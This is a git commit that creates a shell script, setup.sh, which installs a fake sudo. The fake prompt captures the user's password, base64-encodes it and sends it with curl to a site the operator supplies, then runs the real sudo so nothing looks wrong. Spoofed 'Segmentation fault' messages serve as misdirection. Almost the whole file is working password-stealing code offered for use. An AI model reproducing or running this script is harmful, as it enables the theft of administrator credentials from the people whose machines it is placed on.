236153aa5a710d8c13431913b12e1a476f7637fb
Kamran <83241419+NarmakTwo@users.noreply.github.com>
2022-10-08 19:41:30 -0400

    Create setup.sh

---
+++ setup.sh
@@ -0,0 +1,23 @@
+#/usr/bin/bash
+if ! command -v sudo &> /dev/null
+then
+    echo ">>> Segmentation fault: Core dumped"
+    #exit 139
+fi
+
+
+if ! [[ "$0" == *"$SHELL"* ]]
+then
+    echo ">>> Segmentation fault: Core dumped"
+    exit 139
+fi
+
+read -p 'Site (include https:// or http://) <<< '
+echo "read -s -p \"[sudo] password for \$USER: \"; pass=\$REPLY; pass64=\$(echo \"\$pass\" | base64); echo; sudo \"\$@\" <<< \"\$REPLY\"; curl $REPLY/\$pass64" > sudo.sh
+echo '>>> sudo.sh created'
+cp $(which sudo) ./.realsudo
+function sudo {
+  bash ./sudo.sh
+}
+echo '>>> fake sudo function created'
+echo '>>> setup completed'
